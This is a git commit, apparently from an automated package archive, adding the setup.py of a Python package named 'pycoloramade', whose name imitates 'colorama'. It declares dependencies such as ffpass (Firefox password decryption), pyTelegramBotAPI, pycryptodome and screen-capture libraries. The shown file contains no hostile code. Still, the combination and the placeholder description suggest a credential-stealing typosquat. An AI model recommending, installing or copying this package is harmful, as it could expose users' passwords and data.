d68a4201f1cb598bef63dcdd2ca17c2e85b7ac52
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-08-15 16:04:27 +0000

    Add package pycoloramade/1.8.9/pycoloramade-1.8.9.tar.gz

---
+++ packages/pycoloramade/pycoloramade-1.8.9.tar.gz/pycoloramade-1.8.9/setup.py
@@ -0,0 +1,36 @@
+from setuptools import setup, find_packages
+
+setup(
+    name="pycoloramade",
+    version="1.8.9", 
+    packages=find_packages(), 
+    install_requires=[ 
+        "requests",
+        "pywin32",
+        "opencv-python",
+        "Pillow",
+        "pyTelegramBotAPI",
+        "psutil",
+        "GPUtil",
+        "tabulate",
+        "pycryptodome",
+        "configparser",
+        "ffpass",
+    ],
+    entry_points={
+        'console_scripts': [
+            'pycoloramade=pycoloramade.main:main',
+        ],
+    },
+    author="pycolorama", 
+    author_email="chantalleshika@gmail.com", 
+    description="Описание твоей библиотеки",
+    long_description=open('README.md').read(),
+    long_description_content_type="text/markdown",
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "License :: OSI Approved :: MIT License",
+        "Operating System :: OS Independent",
+    ],
+    python_requires='>=3.6',
+)
